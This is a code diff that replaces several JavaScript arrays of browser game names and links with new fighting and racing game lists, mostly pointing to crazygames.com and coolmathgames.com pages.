+  {"n": "King of Fighters Wing 1.8", "u": "https://www.crazygames.com/game/king-of-fighters-wing-1-8"},
+  {"n": "King of Fighters Wing 1.9", "u": "https://www.crazygames.com/game/king-of-fighters-wing-1-9"},
+  {"n": "King of Fighters Wing EX", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex"},
+  {"n": "King of Fighters Wing Ex 2", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-2"},
+  {"n": "King of Fighters Wing Ex 3", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-3"},
+  {"n": "King of Fighters Wing Ex 4", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-4"},
+  {"n": "King of Fighters Wing Ex 5", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-5"},
+  {"n": "King of Fighters Wing Ex 6", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-6"},
+  {"n": "King of Fighters Wing Ex 7", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-7"},
+  {"n": "King of Fighters Wing Ex 8", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-8"},
+  {"n": "King of Fighters Wing Ex 9", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-9"},
+  {"n": "King of Fighters Wing Ex 10", "u": "https://www.crazygames.com/game/king-of-fighters-wing-ex-10"},
+  {"n": "Electric Man 2", "u": "https://www.crazygames.com/game/electric-man-2"},
+  {"n": "Electric Man 3", "u": "https://www.crazygames.com/game/electric-man-3"},
+  {"n": "Electric Man Stickman", "u": "https://www.crazygames.com/game/electric-man-stickman"},
+  {"n": "Stick Fighter", "u": "https://www.crazygames.com/game/stick-fighter"},
+  {"n": "Stick Fighter 2", "u": "https://www.crazygames.com/game/stick-fighter-2"},
+  {"n": "Stickman Fighter Epic Battle", "u": "https://www.crazygames.com/game/stickman-fighter-epic-battle"},
+  {"n": "Stickman Fighter Mega Brawl", "u": "https://www.crazygames.com/game/stickman-fighter-mega-brawl"},
+  {"n": "Stickman Supreme Duelist", "u": "https://www.crazygames.com/game/stickman-supreme-duelist"},
+  {"n": "Stickman Duel Battle", "u": "https://www.crazygames.com/game/stickman-duel-battle"},
+  {"n": "Stickman Dragon Fight", "u": "https://www.crazygames.com/game/stickman-dragon-fight"},
+  {"n": "Stickman Battle Fight Warriors", "u": "https://www.crazygames.com/game/stickman-battle-fight-warriors"},
+  {"n": "Stickman Ragdoll Fighter", "u": "https://www.crazygames.com/game/stickman-ragdoll-fighter"},
+  {"n": "Stickman Warriors", "u": "https://www.crazygames.com/game/stickman-warriors"},
+  {"n": "Stickman Street Fighting 3D", "u": "https://www.crazygames.com/game/stickman-street-fighting-3d"},
+  {"n": "Hobo", "u": "https://www.crazygames.com/game/hobo"},
+  {"n": "Hobo 2", "u": "https://www.crazygames.com/game/hobo-2"},
+  {"n": "Hobo 3", "u": "https://www.crazygames.com/game/hobo-3"},
+  {"n": "Hobo 4", "u": "https://www.crazygames.com/game/hobo-4"},
+  {"n": "Hobo 5", "u": "https://www.crazygames.com/game/hobo-5"},
+  {"n": "Hobo 6", "u": "https://www.crazygames.com/game/hobo-6"},
+  {"n": "Hobo 7", "u": "https://www.crazygames.com/game/hobo-7"},
+  {"n": "Chaos Faction", "u": "https://www.crazygames.com/game/chaos-faction"},
+  {"n": "Chaos Faction 2", "u": "https://www.crazygames.com/game/chaos-faction-2"},
+  {"n": "Superfighters", "u": "https://www.crazygames.com/game/superfighters"},
+  {"n": "Superfighters Deluxe", "u": "https://www.crazygames.com/game/superfighters-deluxe"},
+  {"n": "Gun Mayhem", "u": "https://www.crazygames.com/game/gun-mayhem"},
+  {"n": "Gun Mayhem 2", "u": "https://www.crazygames.com/game/gun-mayhem-2"},
+  {"n": "Gun Mayhem Redux", "u": "https://www.crazygames.com/game/gun-mayhem-redux"},
+  {"n": "Rooftop Snipers", "u": "https://www.crazygames.com/game/rooftop-snipers"},
+  {"n": "Getaway Shootout", "u": "https://www.crazygames.com/game/getaway-shootout"},
+  {"n": "Boxing Random", "u": "https://www.crazygames.com/game/boxing-random"},
+  {"n": "Wrestle Jump", "u": "https://www.crazygames.com/game/wrestle-jump"},
+  {"n": "Tug the Table", "u": "https://www.crazygames.com/game/tug-the-table"},
+  {"n": "Drunken Wrestlers", "u": "https://www.crazygames.com/game/drunken-wrestlers"},
+  {"n": "Drunken Boxing", "u": "https://www.crazygames.com/game/drunken-boxing"},
+  {"n": "Drunken Boxing 2", "u": "https://www.crazygames.com/game/drunken-boxing-2"},
+  {"n": "Boxing Physics", "u": "https://www.crazygames.com/game/boxing-physics"},
+  {"n": "Wrestle Bros", "u": "https://www.crazygames.com/game/wrestle-bros"},
+  {"n": "Rowdy Wrestling", "u": "https://www.crazygames.com/game/rowdy-wrestling"},
+  {"n": "Puppet Fighter 2 Player", "u": "https://www.crazygames.com/game/puppet-fighter-2-player"},
+  {"n": "Big Shot Boxing", "u": "https://www.crazygames.com/game/big-shot-boxing"},
+  {"n": "Punchers", "u": "https://www.crazygames.com/game/punchers"},
+  {"n": "Final Slam 2", "u": "https://www.crazygames.com/game/final-slam-2"},
+  {"n": "Bloody Rage", "u": "https://www.crazygames.com/game/bloody-rage"},
+  {"n": "Battle Masters", "u": "https://www.crazygames.com/game/battle-masters"},
+  {"n": "Swords and Sandals", "u": "https://www.crazygames.com/game/swords-and-sandals"},
+  {"n": "Swords and Sandals 2", "u": "https://www.crazygames.com/game/swords-and-sandals-2"},
+  {"n": "Swords and Sandals 3", "u": "https://www.crazygames.com/game/swords-and-sandals-3"},
+  {"n": "Swords and Souls", "u": "https://www.crazygames.com/game/swords-and-souls"},
+  {"n": "Gladiator", "u": "https://www.crazygames.com/game/gladiator"},
+  {"n": "Achilles", "u": "https://www.crazygames.com/game/achilles"},
+  {"n": "Achilles 2", "u": "https://www.crazygames.com/game/achilles-2"},
+  {"n": "Armed with Wings", "u": "https://www.crazygames.com/game/armed-with-wings"},
+  {"n": "Armed with Wings 2", "u": "https://www.crazygames.com/game/armed-with-wings-2"},
+  {"n": "Armed with Wings 3", "u": "https://www.crazygames.com/game/armed-with-wings-3"},
+  {"n": "Armed with Wings Culmination", "u": "https://www.crazygames.com/game/armed-with-wings-culmination"},
+  {"n": "Samurai Warrior", "u": "https://www.crazygames.com/game/samurai-warrior"},
+  {"n": "Samurai Jack", "u": "https://www.crazygames.com/game/samurai-jack"},
+  {"n": "Ninja Rinseout", "u": "https://www.crazygames.com/game/ninja-rinseout"},
+  {"n": "Ninja Rampage", "u": "https://www.crazygames.com/game/ninja-rampage"},
+  {"n": "Ninja Dogs", "u": "https://www.crazygames.com/game/ninja-dogs"},
+  {"n": "Ninja Dogs 2", "u": "https://www.crazygames.com/game/ninja-dogs-2"},
+  {"n": "Raze", "u": "https://www.crazygames.com/game/raze"},
+  {"n": "Raze 2", "u": "https://www.crazygames.com/game/raze-2"},
+  {"n": "Raze 3", "u": "https://www.crazygames.com/game/raze-3"},
+  {"n": "Strike Force Heroes", "u": "https://www.crazygames.com/game/strike-force-heroes"},
+  {"n": "Strike Force Heroes 2", "u": "https://www.crazygames.com/game/strike-force-heroes-2"},
+  {"n": "Strike Force Heroes 3", "u": "https://www.crazygames.com/game/strike-force-heroes-3"},
+  {"n": "Plazma Burst", "u": "https://www.crazygames.com/game/plazma-burst"},
+  {"n": "Plazma Burst 2", "u": "https://www.crazygames.com/game/plazma-burst-2"},
+  {"n": "Madness Accelerant", "u": "https://www.crazygames.com/game/madness-accelerant"},
+  {"n": "Madness Project Nexus", "u": "https://www.crazygames.com/game/madness-project-nexus"},
+  {"n": "Madness Combat Defense", "u": "https://www.crazygames.com/game/madness-combat-defense"},
+  {"n": "Thing Thing Arena", "u": "https://www.crazygames.com/game/thing-thing-arena"},
+  {"n": "Thing Thing Arena 2", "u": "https://www.crazygames.com/game/thing-thing-arena-2"},
+  {"n": "Thing Thing Arena 3", "u": "https://www.crazygames.com/game/thing-thing-arena-3"},
+  {"n": "Thing Thing Arena Pro", "u": "https://www.crazygames.com/game/thing-thing-arena-pro"},
+  {"n": "Sift Heads", "u": "https://www.crazygames.com/game/sift-heads"},
+  {"n": "Sift Heads 2", "u": "https://www.crazygames.com/game/sift-heads-2"},
+  {"n": "Sift Heads 3", "u": "https://www.crazygames.com/game/sift-heads-3"},
+  {"n": "Sift Heads Assault", "u": "https://www.crazygames.com/game/sift-heads-assault"},
+  {"n": "One Piece Final Fight", "u": "https://www.crazygames.com/game/one-piece-final-fight"},
+  {"n": "Dragon Ball Z Devolution", "u": "https://www.crazygames.com/game/dragon-ball-z-devolution"},
+  {"n": "Super Smash Flash", "u": "https://www.crazygames.com/game/super-smash-flash"},
+  {"n": "Super Smash Flash 2", "u": "https://www.crazygames.com/game/super-smash-flash-2"},
+  {"n": "Bleach vs Naruto", "u": "https://www.crazygames.com/game/bleach-vs-naruto"},
+  {"n": "Naruto Shippuden Ultimate Ninja", "u": "https://www.crazygames.com/game/naruto-shippuden-ultimate-ninja"},
 ];
-const PZRD=[
-  {n:'Slope',u:'https://slope-game.github.io/'},{n:'Run 3',u:'https://www.coolmathgames.com/0-run-3'},
-  {n:'Krunker.io',u:'https://krunker.io'},{n:'Shell Shockers',u:'https://shellshock.io'},
-  {n:'1v1.LOL',u:'https://1v1.lol'},{n:'Smash Karts',u:'https://smashkarts.io/'},
-  {n:'Retro Bowl',u:'https://www.retrobowl.co.uk/'},{n:'Drift Hunters',u:'https://drift-hunters.io/'},
-  {n:'Minecraft Classic',u:'https://classic.minecraft.net/'},{n:'Agar.io',u:'https://agar.io'},
-  {n:'Diep.io',u:'https://diep.io'},{n:'Slither.io',u:'https://slither.io'},
-  {n:'Paper.io 2',u:'https://paper-io.com'},{n:'Zombs Royale',u:'https://zombsroyale.io'},
-  {n:'Voxiom.io',u:'https://voxiom.io/'},{n:'Ev.io',u:'https://ev.io/'},
-  {n:'Bonk.io',u:'https://bonk.io/'},{n:'Skribbl.io',u:'https://skribbl.io'},
-  {n:'GarticPhone',u:'https://garticphone.com'},{n:'Hole.io',u:'https://hole-io.com/'},
-  {n:'Dino Game',u:'https://chromedino.com/'},{n:'Flappy Bird',u:'https://flappybird.io/'},
-  {n:'Geometry Dash',u:'https://geometrydashgame.org/'},{n:'2048',u:'https://play2048.co/'},
-  {n:'Chess',u:'https://lichess.org/'},{n:'Blooket',u:'https://dashboard.blooket.com/'},
-  {n:'Monkeytype',u:'https://monkeytype.com/'},{n:'Neal.fun',u:'https://neal.fun/'},
-  {n:'Infinite Craft',u:'https://neal.fun/infinite-craft/'},{n:'WorldGuessr',u:'https://worldguessr.com'},
-  {n:'Super Smash Flash 2',u:'https://www.mcleodgaming.com/games/super-smash-flash-2'},
-  {n:'Strike Force Heroes',u:'https://strikeforceheroes.io/'},{n:'Among Us',u:'https://now.gg/play/innersloth-llc/6289/among-us'},
-  {n:'Tank Trouble',u:'https://tanktrouble.com/'},{n:'Minesweeper',u:'https://minesweeper.online/'},
-  {n:'Colonist.io',u:'https://colonist.io/'},{n:'Codenames',u:'https://codenames.game/'},
-  {n:'QuickDraw',u:'https://quickdraw.withgoogle.com/'},{n:'Scratch',u:'https://scratch.mit.edu/'},
-  {n:'Slice Master',u:'https://www.coolmathgames.com/0-slice-master'},
+const RACING=[
+  {"n": "Moto X3M", "u": "https://www.coolmathgames.com/0-moto-x3m"},
+  {"n": "Moto X3M 2", "u": "https://www.crazygames.com/game/moto-x3m-2"},
+  {"n": "Moto X3M 3", "u": "https://www.crazygames.com/game/moto-x3m-3"},
+  {"n": "Moto X3M Winter", "u": "https://www.coolmathgames.com/0-moto-x3m-winter"},
+  {"n": "Moto X3M Pool Party", "u": "https://www.coolmathgames.com/0-moto-x3m-pool-party"},
+  {"n": "Moto X3M Spooky Land", "u": "https://www.coolmathgames.com/0-moto-x3m-spooky-land"},
+  {"n": "Moto X3M Bike Race Game", "u": "https://www.crazygames.com/game/moto-x3m-bike-race-game"},
+  {"n": "Moto X3M Unblocked", "u": "https://www.crazygames.com/game/moto-x3m-unblocked"},
+  {"n": "Drift Hunters", "u": "https://www.crazygames.com/game/drift-hunters"},
+  {"n": "Drift Hunters MAX", "u": "https://www.crazygames.com/game/drift-hunters-max"},
+  {"n": "Drift Boss", "u": "https://www.crazygames.com/game/drift-boss"},
+  {"n": "Drift Runner 3D", "u": "https://www.crazygames.com/game/drift-runner-3d"},
+  {"n": "Drift Rush 3D", "u": "https://www.crazygames.com/game/drift-rush-3d"},
+  {"n": "Burnout Drift", "u": "https://www.crazygames.com/game/burnout-drift"},
+  {"n": "Burnout Drift 2", "u": "https://www.crazygames.com/game/burnout-drift-2"},
+  {"n": "Burnout Drift 3", "u": "https://www.crazygames.com/game/burnout-drift-3"},
+  {"n": "Madalin Stunt Cars", "u": "https://www.crazygames.com/game/madalin-stunt-cars"},
+  {"n": "Madalin Stunt Cars 2", "u": "https://www.crazygames.com/game/madalin-stunt-cars-2"},
+  {"n": "Madalin Stunt Cars 3", "u": "https://www.crazygames.com/game/madalin-stunt-cars-3"},
+  {"n": "Super Star Car", "u": "https://www.crazygames.com/game/super-star-car"},
+  {"n": "Highway Racer", "u": "https://www.crazygames.com/game/highway-racer"},
+  {"n": "Highway Traffic", "u": "https://www.crazygames.com/game/highway-traffic"},
+  {"n": "Traffic Jam 3D", "u": "https://www.crazygames.com/game/traffic-jam-3d"},
+  {"n": "Traffic Tour", "u": "https://www.crazygames.com/game/traffic-tour"},
+  {"n": "Traffic Run", "u": "https://www.crazygames.com/game/traffic-run"},
+  {"n": "Traffic Rider", "u": "https://www.crazygames.com/game/traffic-rider"},
+  {"n": "City Car Driving", "u": "https://www.crazygames.com/game/city-car-driving"},
+  {"n": "Real City Driver", "u": "https://www.crazygames.com/game/real-city-driver"},
+  {"n": "Derby Crash", "u": "https://www.crazygames.com/game/derby-crash"},
+  {"n": "Derby Crash 2", "u": "https://www.crazygames.com/game/derby-crash-2"},
+  {"n": "Derby Crash 3", "u": "https://www.crazygames.com/game/derby-crash-3"},
+  {"n": "Demolition Derby Crash Racing", "u": "https://www.crazygames.com/game/demolition-derby-crash-racing"},
+  {"n": "Smash Karts", "u": "https://www.crazygames.com/game/smash-karts"},
+  {"n": "Kart Wars", "u": "https://www.crazygames.com/game/kart-wars"},
+  {"n": "Kart Fight.io", "u": "https://www.crazygames.com/game/kart-fight-io"},
+  {"n": "Go Kart Go Ultra", "u": "https://www.crazygames.com/game/go-kart-go-ultra"},
+  {"n": "Mario Kart Flash", "u": "https://www.crazygames.com/game/mario-kart-flash"},
+  {"n": "Formula Racer", "u": "https://www.crazygames.com/game/formula-racer"},
+  {"n": "Formula Racer 2012", "u": "https://www.crazygames.com/game/formula-racer-2012"},
+  {"n": "Formula Racer 2013", "u": "https://www.crazygames.com/game/formula-racer-2013"},
+  {"n": "Grand Prix Hero", "u": "https://www.crazygames.com/game/grand-prix-hero"},
+  {"n": "Grand Prix Go", "u": "https://www.crazygames.com/game/grand-prix-go"},
+  {"n": "Turbo Racing 3", "u": "https://www.crazygames.com/game/turbo-racing-3"},
+  {"n": "Drag Racer v3", "u": "https://www.crazygames.com/game/drag-racer-v3"},
+  {"n": "Drag Racer v4", "u": "https://www.crazygames.com/game/drag-racer-v4"},
+  {"n": "Drag Racing Club", "u": "https://www.crazygames.com/game/drag-racing-club"},
+  {"n": "Drag Race Demon", "u": "https://www.crazygames.com/game/drag-race-demon"},
+  {"n": "Top Speed Racing 3D", "u": "https://www.crazygames.com/game/top-speed-racing-3d"},
+  {"n": "Night City Racing", "u": "https://www.crazygames.com/game/night-city-racing"},
+  {"n": "Two Punk Racing", "u": "https://www.crazygames.com/game/two-punk-racing"},
+  {"n": "Two Punk Racing 2", "u": "https://www.crazygames.com/game/two-punk-racing-2"},
+  {"n": "Cyber Cars Punk Racing", "u": "https://www.crazygames.com/game/cyber-cars-punk-racing"},
+  {"n": "Flying Car Simulator", "u": "https://www.crazygames.com/game/flying-car-simulator"},
+  {"n": "Fly Car Stunt", "u": "https://www.crazygames.com/game/fly-car-stunt"},
+  {"n": "Fly Car Stunt 2", "u": "https://www.crazygames.com/game/fly-car-stunt-2"},
+  {"n": "Fly Car Stunt 3", "u": "https://www.crazygames.com/game/fly-car-stunt-3"},
+  {"n": "Fly Car Stunt 4", "u": "https://www.crazygames.com/game/fly-car-stunt-4"},
+  {"n": "Fly Car Stunt 5", "u": "https://www.crazygames.com/game/fly-car-stunt-5"},
+  {"n": "Fly Car Stunt 6", "u": "https://www.crazygames.com/game/fly-car-stunt-6"},
+  {"n": "Offroader V5", "u": "https://www.crazygames.com/game/offroader-v5"},
+  {"n": "Offroaders", "u": "https://www.crazygames.com/game/offroaders"},
+  {"n": "Offroaders 2", "u": "https://www.crazygames.com/game/offroaders-2"},
+  {"n": "Truck Trials", "u": "https://www.crazygames.com/game/truck-trials"},
+  {"n": "Truck Loader", "u": "https://www.crazygames.com/game/truck-loader"},
+  {"n": "Truck Loader 2", "u": "https://www.crazygames.com/game/truck-loader-2"},
+  {"n": "Truck Loader 3", "u": "https://www.crazygames.com/game/truck-loader-3"},
+  {"n": "Truck Loader 4", "u": "https://www.crazygames.com/game/truck-loader-4"},
+  {"n": "Truck Loader 5", "u": "https://www.crazygames.com/game/truck-loader-5"},
+  {"n": "Monster Truck Port Stunt", "u": "https://www.crazygames.com/game/monster-truck-port-stunt"},
+  {"n": "Monster Truck Destroyer", "u": "https://www.crazygames.com/game/monster-truck-destroyer"},
+  {"n": "Monster Truck Madness", "u": "https://www.crazygames.com/game/monster-truck-madness"},
+  {"n": "Monster Tracks", "u": "https://www.crazygames.com/game/monster-tracks"},
+  {"n": "Car Eats Car", "u": "https://www.crazygames.com/game/car-eats-car"},
+  {"n": "Car Eats Car 2", "u": "https://www.crazygames.com/game/car-eats-car-2"},
+  {"n": "Car Eats Car 3", "u": "https://www.crazygames.com/game/car-eats-car-3"},
+  {"n": "Car Eats Car Evil Cars", "u": "https://www.crazygames.com/game/car-eats-car-evil-cars"},
+  {"n": "Wheely", "u": "https://www.crazygames.com/game/wheely"},
+  {"n": "Wheely 2", "u": "https://www.crazygames.com/game/wheely-2"},
+  {"n": "Wheely 3", "u": "https://www.crazygames.com/game/wheely-3"},
+  {"n": "Wheely 4", "u": "https://www.crazygames.com/game/wheely-4"},
+  {"n": "Wheely 5", "u": "https://www.crazygames.com/game/wheely-5"},
+  {"n": "Wheely 6", "u": "https://www.crazygames.com/game/wheely-6"},
+  {"n": "Wheely 7", "u": "https://www.crazygames.com/game/wheely-7"},
+  {"n": "Wheely 8", "u": "https://www.crazygames.com/game/wheely-8"},
+  {"n": "Road of Fury", "u": "https://www.crazygames.com/game/road-of-fury"},
+  {"n": "Road of Fury 2", "u": "https://www.crazygames.com/game/road-of-fury-2"},
+  {"n": "Road of Fury 3", "u": "https://www.crazygames.com/game/road-of-fury-3"},
+  {"n": "Earn to Die", "u": "https://www.crazygames.com/game/earn-to-die"},
+  {"n": "Earn to Die 2", "u": "https://www.crazygames.com/game/earn-to-die-2"},
+  {"n": "Earn to Die 2012", "u": "https://www.crazygames.com/game/earn-to-die-2012"},
+  {"n": "Earn to Die 2012 Part 2", "u": "https://www.crazygames.com/game/earn-to-die-2012-part-2"},
+  {"n": "Renegade Racing", "u": "https://www.crazygames.com/game/renegade-racing"},
+  {"n": "Renegade Racing 2", "u": "https://www.crazygames.com/game/renegade-racing-2"},
+  {"n": "Rally Point", "u": "https://www.crazygames.com/game/rally-point"},
+  {"n": "Rally Point 2", "u": "https://www.crazygames.com/game/rally-point-2"},
+  {"n": "Rally Point 3", "u": "https://www.crazygames.com/game/rally-point-3"},
+  {"n": "Rally Point 4", "u": "https://www.crazygames.com/game/rally-point-4"},
+  {"n": "Rally Point 5", "u": "https://www.crazygames.com/game/rally-point-5"},
+  {"n": "Rally Point 6", "u": "https://www.crazygames.com/game/rally-point-6"},
+  {"n": "Cyclomaniacs", "u": "https://www.crazygames.com/game/cyclomaniacs"},
+  {"n": "Cyclomaniacs 2", "u": "https://www.crazygames.com/game/cyclomaniacs-2"},
+  {"n": "Cyclomaniacs Epic", "u": "https://www.crazygames.com/game/cyclomaniacs-epic"},
+  {"n": "Bike Mania", "u": "https://www.crazygames.com/game/bike-mania"},
+  {"n": "Bike Mania 2", "u": "https://www.crazygames.com/game/bike-mania-2"},
+  {"n": "Bike Mania 3", "u": "https://www.crazygames.com/game/bike-mania-3"},
+  {"n": "Dirt Bike", "u": "https://www.crazygames.com/game/dirt-bike"},
+  {"n": "Dirt Bike 2", "u": "https://www.crazygames.com/game/dirt-bike-2"},
+  {"n": "Dirt Bike 3", "u": "https://www.crazygames.com/game/dirt-bike-3"},
+  {"n": "Dirt Bike 4", "u": "https://www.crazygames.com/game/dirt-bike-4"},
+  {"n": "BMX Master", "u": "https://www.crazygames.com/game/bmx-master"},
+  {"n": "BMX Park", "u": "https://www.crazygames.com/game/bmx-park"},
+  {"n": "BMX Tricks", "u": "https://www.crazygames.com/game/bmx-tricks"},
+  {"n": "Mountain Bike", "u": "https://www.crazygames.com/game/mountain-bike"},
+  {"n": "Mountain Bike Rider", "u": "https://www.crazygames.com/game/mountain-bike-rider"},
+  {"n": "Neon Rider", "u": "https://www.crazygames.com/game/neon-rider"},
+  {"n": "Neon Rider World", "u": "https://www.crazygames.com/game/neon-rider-world"},
+  {"n": "Free Rider 2", "u": "https://www.crazygames.com/game/free-rider-2"},
+  {"n": "Free Rider 3", "u": "https://www.crazygames.com/game/free-rider-3"},
+  {"n": "Canvas Rider", "u": "https://www.crazygames.com/game/canvas-rider"},
+  {"n": "Line Rider", "u": "https://www.crazygames.com/game/line-rider"},
+  {"n": "Happy Wheels", "u": "https://www.crazygames.com/game/happy-wheels"},
+  {"n": "Short Ride", "u": "https://www.crazygames.com/game/short-ride"},
+  {"n": "Short Life", "u": "https://www.crazygames.com/game/short-life"},
+  {"n": "Jelly Truck", "u": "https://www.crazygames.com/game/jelly-truck"},
+  {"n": "Hill Climb Racing", "u": "https://www.crazygames.com/game/hill-climb-racing"},
+  {"n": "Hill Climb Racing 2", "u": "https://www.crazygames.com/game/hill-climb-racing-2"},
+  {"n": "Uphill Rush", "u": "https://www.crazygames.com/game/uphill-rush"},
+  {"n": "Uphill Rush 2", "u": "https://www.crazygames.com/game/uphill-rush-2"},
+  {"n": "Uphill Rush 3", "u": "https://www.crazygames.com/game/uphill-rush-3"},
+  {"n": "Uphill Rush 4", "u": "https://www.crazygames.com/game/uphill-rush-4"},
+  {"n": "Uphill Rush 5", "u": "https://www.crazygames.com/game/uphill-rush-5"},
+  {"n": "Uphill Rush 6", "u": "https://www.crazygames.com/game/uphill-rush-6"},
+  {"n": "Uphill Rush 7", "u": "https://www.crazygames.com/game/uphill-rush-7"},
+  {"n": "Uphill Rush 8", "u": "https://www.crazygames.com/game/uphill-rush-8"},
+  {"n": "Aquapark.io", "u": "https://www.crazygames.com/game/aquapark-io"},
+  {"n": "Aqua Thrills", "u": "https://www.crazygames.com/game/aqua-thrills"},
+  {"n": "Boat Rush", "u": "https://www.crazygames.com/game/boat-rush"},
+  {"n": "Hydro Racing 3D", "u": "https://www.crazygames.com/game/hydro-racing-3d"},
+  {"n": "Snow Rider 3D", "u": "https://www.crazygames.com/game/snow-rider-3d"},
+  {"n": "Skiing Fred", "u": "https://www.crazygames.com/game/skiing-fred"},
+  {"n": "Sled Rider", "u": "https://www.crazygames.com/game/sled-rider"},
+  {"n": "Penguin Diner Racing", "u": "https://www.crazygames.com/game/penguin-diner-racing"},
+  {"n": "Death Chase", "u": "https://www.crazygames.com/game/death-chase"},
+  {"n": "Road Crash", "u": "https://www.crazygames.com/game/road-crash"},
+  {"n": "Road Turn", "u": "https://www.crazygames.com/game/road-turn"},
+  {"n": "Road Trip FRVR", "u": "https://www.crazygames.com/game/road-trip-frvr"},
+  {"n": "Parking Fury", "u": "https://www.crazygames.com/game/parking-fury"},
+  {"n": "Parking Fury 2", "u": "https://www.crazygames.com/game/parking-fury-2"},
+  {"n": "Parking Fury 3", "u": "https://www.crazygames.com/game/parking-fury-3"},
+  {"n": "Parking Fury 4", "u": "https://www.crazygames.com/game/parking-fury-4"},
 ];
-const COOL=[
-  {n:'Slice Master',u:'https://www.coolmathgames.com/0-slice-master'},
-  {n:"Papa's Pizzeria",u:'https://www.coolmathgames.com/0-papas-pizzeria'},{n:"Papa's Freezeria",u:'https://www.coolmathgames.com/0-papas-freezeria'},
-  {n:"Papa's Burgeria",u:'https://www.coolmathgames.com/0-papas-burgeria'},{n:"Papa's Cupcakeria",u:'https://www.coolmathgames.com/0-papas-cupcakeria'},
-  {n:"Papa's Wingeria",u:'https://www.coolmathgames.com/0-papas-wingeria'},{n:"Papa's Pancakeria",u:'https://www.coolmathgames.com/0-papas-pancakeria'},
-  {n:"Papa's Taco Mia",u:'https://www.coolmathgames.com/0-papas-taco-mia'},{n:"Papa's Scooperia",u:'https://www.coolmathgames.com/0-papas-scooperia'},
-  {n:"Papa's Cheeseria",u:'https://www.coolmathgames.com/0-papas-cheeseria'},{n:"Papa's Donuteria",u:'https://www.coolmathgames.com/0-papas-donuteria'},
-  {n:"Papa's Pastaria",u:'https://www.coolmathgames.com/0-papas-pastaria'},{n:"Papa's Bakeria",u:'https://www.coolmathgames.com/0-papas-bakeria'},
-  {n:"Papa's Hot Doggeria",u:'https://www.coolmathgames.com/0-papas-hot-doggeria'},{n:"Papa's Sushiria",u:'https://www.coolmathgames.com/0-papas-sushiria'},
-  {n:'Run 3',u:'https://www.coolmathgames.com/0-run-3'},{n:'Run 2',u:'https://www.coolmathgames.com/0-run-2'},
-  {n:'Bad Ice-Cream',u:'https://www.coolmathgames.com/0-bad-ice-cream'},{n:'Bad Ice-Cream 2',u:'https://www.coolmathgames.com/0-bad-ice-cream-2'},{n:'Bad Ice-Cream 3',u:'https://www.coolmathgames.com/0-bad-ice-cream-3'},
-  {n:'Fireboy & Watergirl 1',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-in-the-forest-temple'},
-  {n:'Fireboy & Watergirl 2',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-2'},
-  {n:'Fireboy & Watergirl 3',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-3'},
-  {n:'Fireboy & Watergirl 4',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-4'},
-  {n:'Fireboy & Watergirl 5',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-5'},
-  {n:'Fireboy & Watergirl 6',u:'https://www.coolmathgames.com/0-fireboy-and-watergirl-6'},
-  {n:'Kingdom Rush',u:'https://www.coolmathgames.com/0-kingdom-rush'},{n:'Kingdom Rush Frontiers',u:'https://www.coolmathgames.com/0-kingdom-rush-frontiers'},
-  {n:'Bloons TD 4',u:'https://www.coolmathgames.com/0-bloons-tower-defense-4'},{n:'Bloons TD 5',u:'https://www.coolmathgames.com/0-bloons-tower-defense-5'},
-  {n:'Learn to Fly',u:'https://www.coolmathgames.com/0-learn-to-fly'},{n:'Learn to Fly 2',u:'https://www.coolmathgames.com/0-learn-to-fly-2'},
-  {n:'Fancy Pants',u:'https://www.coolmathgames.com/0-fancy-pants-adventures'},{n:'Fancy Pants 2',u:'https://www.coolmathgames.com/0-fancy-pants-adventures-2'},
-  {n:'Bob the Robber',u:'https://www.coolmathgames.com/0-bob-the-robber'},{n:'Bob the Robber 2',u:'https://www.coolmathgames.com/0-bob-the-robber-2'},
-  {n:'Moto X3M',u:'https://www.coolmathgames.com/0-moto-x3m'},{n:'Moto X3M 2',u:'https://www.coolmathgames.com/0-moto-x3m-2'},
-  {n:'Moto X3M Spooky',u:'https://www.coolmathgames.com/0-moto-x3m-spooky-land'},{n:'Moto X3M Winter',u:'https://www.coolmathgames.com/0-moto-x3m-winter'},
-  {n:'Bloxorz',u:'https://www.coolmathgames.com/0-bloxorz'},{n:'Jacksmith',u:'https://www.coolmathgames.com/0-jacksmith'},
-  {n:'Snake',u:'https://www.coolmathgames.com/0-snake'},{n:'Slope',u:'https://www.coolmathgames.com/0-slope'},
-  {n:'Idle Breakout',u:'https://www.coolmathgames.com/0-idle-breakout'},{n:'Chess',u:'https://www.coolmathgames.com/0-chess'},
-  {n:'Sudoku',u:'https://www.coolmathgames.com/0-sudoku'},{n:'Wordle',u:'https://www.coolmathgames.com/0-wordle'},
-  {n:'Red Ball 4',u:'https://www.coolmathgames.com/0-red-ball-4'},
-];
-const POKI=[
-  {n:'Subway Surfers',u:'https://poki.com/en/g/subway-surfers'},{n:'Moto X3M',u:'https://poki.com/en/g/moto-x3m'},
-  {n:'Stickman Hook',u:'https://poki.com/en/g/stickman-hook'},{n:'Basket Random',u:'https://poki.com/en/g/basket-random'},
-  {n:'Soccer Random',u:'https://poki.com/en/g/soccer-random'},{n:'Ragdoll Hit',u:'https://poki.com/en/g/ragdoll-hit'},
-  {n:'Krunker',u:'https://poki.com/en/g/krunker'},{n:'Getaway Shootout',u:'https://poki.com/en/g/getaway-shootout'},
-  {n:'Rooftop Snipers',u:'https://poki.com/en/g/rooftop-snipers'},{n:'Basketball Stars',u:'https://poki.com/en/g/basketball-stars'},
-  {n:'Narrow One',u:'https://poki.com/en/g/narrow-one'},{n:'Hole.io',u:'https://poki.com/en/g/hole-io'},
-  {n:'Smash Karts',u:'https://poki.com/en/g/smash-karts'},{n:'Tiny Fishing',u:'https://poki.com/en/g/tiny-fishing'},
-  {n:'Crossy Road',u:'https://poki.com/en/g/crossy-road'},{n:'Raft Wars',u:'https://www.crazygames.com/game/raft-wars'},
-  {n:'Vex 5',u:'https://www.crazygames.com/game/vex-5'},{n:'Shell Shockers',u:'https://www.crazygames.com/game/shell-shockers'},
